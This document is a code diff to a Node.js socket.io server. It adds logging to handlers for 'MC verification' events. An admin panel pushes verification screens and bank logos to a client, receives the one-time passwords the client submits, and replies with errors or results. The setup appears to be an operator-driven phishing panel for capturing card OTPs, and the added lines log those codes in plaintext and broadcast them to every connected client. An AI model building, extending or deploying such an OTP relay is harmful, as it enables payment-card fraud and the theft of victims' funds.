@@ -695,12 +695,16 @@ app.get('/api/getTransactionForFail', (req, res) => {
 });
 
 io.on('connection', (socket) => {
+  console.log('New socket connection established with ID:', socket.id);
+  
   socket.on('join', (invoiceId) => {
+    console.log(`Socket ${socket.id} joining room for invoiceId:`, invoiceId);
     socket.join(invoiceId);
   });
   
   // Add listener for currency page redirection
   socket.on('currency_redirect', (data) => {
+    console.log('Received currency_redirect event:', data);
     if (data.invoiceId && transactions.has(data.invoiceId) && data.pid) {
       io.to(data.invoiceId).emit('redirect_to_currency', { 
         redirectUrl: `/currencypayment.html?pid=${data.pid}` 
@@ -708,14 +712,16 @@ io.on('connection', (socket) => {
     }
   });
   
-  // MC verification events
+  // MC verification events - enhanced with logging
   socket.on('show_mc_verification', (data) => {
     // Broadcast to the client with this invoice ID
+    console.log('Received show_mc_verification event:', data);
     io.to(data.invoiceId).emit('show_mc_verification', data);
   });
   
   socket.on('update_mc_bank', (data) => {
     // Update bank logo on client
+    console.log('Received update_mc_bank event:', data);
     io.to(data.invoiceId).emit('update_mc_bank', {
       invoiceId: data.invoiceId,
       bankCode: data.bankCode
@@ -724,21 +730,30 @@ io.on('connection', (socket) => {
   
   socket.on('mc_otp_submitted', (data) => {
     // Notify admin panel of OTP submission
-    io.emit('mc_otp_submitted', data);
+    console.log('Received mc_otp_submitted event with OTP:', data.otp, 'for Invoice:', data.invoiceId);
+    io.emit('mc_otp_submitted', data);  // Broadcast to ALL clients including admin
   });
   
   socket.on('mc_otp_error', (data) => {
     // Send OTP error to client
+    console.log('Sending OTP error to client:', data);
     io.to(data.invoiceId).emit('mc_otp_error', data);
   });
   
   socket.on('mc_verification_result', (data) => {
     // Send verification result to client
+    console.log('Sending verification result to client:', data);
     io.to(data.invoiceId).emit('mc_verification_result', data);
   });
   
   socket.on('mc_resend_otp', (data) => {
     // Notify admin panel of OTP resend request
-    io.emit('mc_resend_otp', data);
+    console.log('Received mc_resend_otp request for invoice:', data.invoiceId);
+    io.emit('mc_resend_otp', data);  // Broadcast to ALL clients including admin
+  });
+  
+  // Handle disconnect
+  socket.on('disconnect', () => {
+    console.log('Socket disconnected:', socket.id);
   });
 });
